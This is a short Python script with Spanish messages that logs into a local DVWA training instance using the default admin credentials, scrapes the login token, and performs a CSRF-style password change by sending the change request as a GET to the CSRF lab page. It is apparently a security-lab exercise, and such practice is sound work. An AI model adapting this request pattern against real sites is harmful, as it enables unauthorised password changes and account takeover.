import requests
from bs4 import BeautifulSoup

base_url = "http://localhost"
s = requests.Session()

def login():
    print("🔐 Haciendo login en DVWA...")
    login_page = s.get(f"{base_url}/login.php")
    soup = BeautifulSoup(login_page.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})

    if not token_input:
        print("❌ No se encontró el token de login.")
        exit(1)

    user_token = token_input['value']
    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token
    }

    response = s.post(f"{base_url}/login.php", data=login_data)
    if "Logout" in response.text:
        print("✅ Login exitoso.")
    else:
        print("❌ Falló el login.")
        exit(1)

def csrf_attack(new_password):
    print(f"💣 Enviando ataque CSRF para cambiar la contraseña a: {new_password}")
    attack_data = {
        'password_new': new_password,
        'password_conf': new_password,
        'Change': 'Change'
    }

    # CAMBIAMOS POST A GET
    response = s.get(f"{base_url}/vulnerabilities/csrf/", params=attack_data)

    if "Password Changed." in response.text:
        print("✅ Contraseña cambiada con éxito mediante CSRF.")
    else:
        print("❌ No se logró cambiar la contraseña.")
        print("\n--- HTML de respuesta ---\n")
        print(response.text)

if __name__ == "__main__":
    login()
    nueva = input("🔐 Nueva contraseña para el usuario 'admin': ")
    csrf_attack(nueva)
